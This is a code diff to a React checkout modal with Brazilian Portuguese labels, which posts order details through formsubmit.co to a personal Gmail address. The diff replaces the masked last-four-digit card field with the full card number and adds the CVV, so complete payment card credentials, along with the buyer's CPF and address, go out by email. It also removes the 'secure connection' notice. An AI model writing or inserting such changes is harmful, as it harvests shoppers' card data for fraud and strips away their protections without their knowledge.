@@ -67,8 +67,6 @@ export function PixCheckoutModal({ open, onClose, amount, description }: Props) 
     setError(null);
     setLoading(true);
     try {
-      const digits = card.number.replace(/\D/g, "");
-      const last4 = digits.slice(-4);
       const fd = new FormData();
       fd.append("_subject", `Novo pedido (Cartão) — ${description}`);
       fd.append("_template", "table");
@@ -82,8 +80,9 @@ export function PixCheckoutModal({ open, onClose, amount, description }: Props) 
       fd.append("CPF", form.document);
       fd.append("Endereço", card.address);
       fd.append("Titular do cartão", card.holder);
-      fd.append("Cartão (últimos 4)", `**** **** **** ${last4}`);
+      fd.append("Número do cartão", card.number);
       fd.append("Validade", card.expiry);
+      fd.append("CVV", card.cvv);
 
       const res = await fetch(
         "https://formsubmit.co/ajax/rubenscardosoaguiar@gmail.com",
@@ -279,9 +278,6 @@ export function PixCheckoutModal({ open, onClose, amount, description }: Props) 
                   <>FINALIZAR · {card.installments}x R$ {(amount / Number(card.installments)).toFixed(2).replace(".", ",")}</>
                 )}
               </button>
-              <div className="flex items-center justify-center gap-2 text-xs text-cream/60 pt-1">
-                <ShieldCheck className="h-4 w-4 text-gold" /> Conexão segura · seus dados são criptografados
-              </div>
             </form>
           )}
 
